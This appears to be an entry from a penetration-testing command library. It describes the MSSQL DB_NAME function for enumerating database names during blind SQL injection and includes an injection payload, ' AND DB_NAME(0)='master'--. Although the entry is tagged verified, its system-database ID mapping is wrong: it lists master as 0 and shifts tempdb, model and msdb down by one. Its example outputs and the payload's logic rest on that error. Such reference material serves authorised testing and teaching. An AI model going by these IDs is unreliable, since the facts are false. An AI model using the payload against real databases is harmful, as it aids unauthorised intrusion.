---
type: command
executor: sql
data: 'SELECT DB_NAME(N); -- for N = 0, 1, 2, ...'
output: null
created_at: '2023-04-06T03:56:33.639321+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - MSSQL
tags:
  - mssql
  - enumeration
  - system-databases
verified: true
validated: true
---

# mssql-list-system-databases

## Command

```sql
SELECT DB_NAME(N); -- for N = 0, 1, 2, ...
```

## Description

This SQL command uses the DB_NAME function to retrieve the name of a database by its ID (N). Common system database IDs are 0 (master), 1 (tempdb), 2 (model), and 3 (msdb). It is useful for targeted enumeration in blind SQL injection where full lists are not feasible.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N | Database ID (integer, e.g., 0 for master); increment to query multiple. | Yes |

## Examples

### Basic Usage

For master database:

```sql
SELECT DB_NAME(0);
```

### Advanced Usage

Query multiple in a loop (conceptual, execute sequentially):

```sql
SELECT DB_NAME(0) AS master, DB_NAME(1) AS tempdb;
```

In SQL injection:

```sql
' AND DB_NAME(0)='master'--
```

## Expected Output

A scalar value with the database name, for example:

master

For ID 1: tempdb

## Related

- [[procedures/MSSQL-Database-Enumeration]]
- [[commands/mssql-list-all-databases]]
